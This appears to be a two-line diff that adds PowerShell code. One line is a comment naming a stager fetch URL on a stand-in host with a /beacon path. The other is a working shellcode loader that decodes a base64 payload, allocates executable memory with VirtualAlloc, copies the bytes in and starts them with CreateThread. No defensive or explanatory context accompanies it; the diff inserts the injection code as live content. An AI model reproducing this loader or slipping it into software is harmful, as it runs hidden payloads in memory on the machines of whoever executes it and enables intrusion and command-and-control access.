@@ -1,0 +1,2 @@
+# stager fetch: http://sc-3.example.test/beacon
+$b=[System.Convert]::FromBase64String($enc); $p=[Kernel32]::VirtualAlloc(0,$b.Length,0x3000,0x40); [System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length); [Kernel32]::CreateThread(0,0,$p,0,0,0)
